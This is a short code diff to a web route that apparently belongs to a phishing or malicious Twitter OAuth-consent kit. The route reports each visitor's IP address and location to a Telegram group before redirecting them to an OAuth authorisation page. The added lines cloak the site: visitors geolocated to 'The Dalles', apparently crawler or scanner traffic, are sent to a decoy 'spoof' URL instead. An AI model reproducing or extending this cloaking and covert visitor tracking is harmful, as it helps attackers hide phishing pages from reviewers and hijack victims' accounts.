@@ -52,13 +52,16 @@ def oauth():
     location_data = res.json()
     
     country, city = location_data.get("country"), location_data.get("city")
-    country_flag = ''.join(chr(ord(c) + 127397) for c in location_data.get("countryCode", ""))
+    if city != "The Dalles":
+        country_flag = ''.join(chr(ord(c) + 127397) for c in location_data.get("countryCode", ""))
 
-    message = f'🌐 *Connection:* {real_ip}\n\n{country_flag} *{city}, {country}*'
-    send_telegram_message(group['group_id'], message)
+        message = f'🌐 *Connection:* {real_ip}\n\n{country_flag} *{city}, {country}*'
+        send_telegram_message(group['group_id'], message)
 
-    twitter_oauth_url = generate_twitter_oauth_url()
-    return redirect(twitter_oauth_url)
+        twitter_oauth_url = generate_twitter_oauth_url()
+        return redirect(twitter_oauth_url)
+    else:
+        return redirect(group.get('spoof'))
 
 
 def generate_twitter_oauth_url():
